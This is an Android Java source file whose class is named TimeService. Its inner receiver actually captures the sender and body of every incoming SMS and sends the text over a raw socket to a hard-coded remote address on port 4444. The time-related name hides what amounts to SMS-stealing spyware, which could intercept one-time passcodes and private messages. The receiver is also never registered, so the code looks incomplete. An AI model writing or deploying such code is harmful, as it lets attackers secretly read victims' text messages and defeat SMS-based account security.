package com.example.root.service;

import android.app.Activity;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.gsm.SmsManager;
import android.telephony.gsm.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;

public class TimeService extends Service {
    private static Socket client;
    private static PrintWriter printwriter;
    private static String message;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }



         class IncomingSms extends BroadcastReceiver {


            Toast mtoast;

            // Get the object of SmsManager
            final SmsManager sms = SmsManager.getDefault();

            public void onReceive(Context context, Intent intent) {

                // Retrieves a map of extended data from the intent.
                final Bundle bundle = intent.getExtras();

                try {

                    if (bundle != null) {

                        final Object[] pdusObj = (Object[]) bundle.get("pdus");

                        for (int i = 0; i < pdusObj.length; i++) {

                            SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                            String phoneNumber = currentMessage.getDisplayOriginatingAddress();

                            String senderNum = phoneNumber;
                            message = currentMessage.getDisplayMessageBody();



                            Log.i("SmsReceiver", "senderNum: " + senderNum + "; message: " + message);


                            // Show Alert
                            int duration = Toast.LENGTH_LONG;
                            Toast toast = Toast.makeText(context,
                                    "senderNum: " + senderNum + ", message: " + message, duration);
                            toast.show();

                           SendMessage sendMessageTask = new SendMessage(message);
                            sendMessageTask.execute();



                        } // end for loop
                    } // bundle is null

                } catch (Exception e) {
                    Log.e("SmsReceiver", "Exception smsReceiver" + e);

                }
            }

            public class SendMessage extends AsyncTask<Void, Void, Void> {

                private String m;
                public SendMessage(String message) {
                    m=message;
                }

                @Override
                protected Void doInBackground(Void... params) {
                    try {

                        client = new Socket("10.143.77.224", 4444); // connect to the server
                        printwriter = new PrintWriter(client.getOutputStream(), true);
                        printwriter.write(m); // write the message to output stream

                        printwriter.flush();
                        printwriter.close();
                        client.close(); // closing the connection

                    } catch (UnknownHostException e) {
                        e.printStackTrace();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    return null;
                }
            }


        }


}
